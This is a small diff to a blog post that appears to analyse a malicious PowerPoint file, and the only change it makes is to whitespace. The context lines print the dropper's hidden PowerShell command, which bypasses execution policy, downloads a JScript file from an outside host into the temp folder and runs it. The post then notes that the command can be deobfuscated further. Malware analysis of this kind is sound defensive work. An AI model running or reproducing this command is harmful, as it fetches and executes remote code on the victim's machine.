@@ -22,7 +22,7 @@ The command is:
 ```ps
 powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http:'+[char] 0x2F+[char] 0x2F+'cccn.nl'+[char] 0x2F+'c.php',\"$env:temp\ii.jse\"); Invoke-Item \"$env:temp\ii.jse\""
 ```
-
+ 
 We can further deobfuscate this command using engines like [tio.run](https://tio.run/):  
 ![tio.run](/posts/maliciousppt/tioRun_powershell.png)  
 
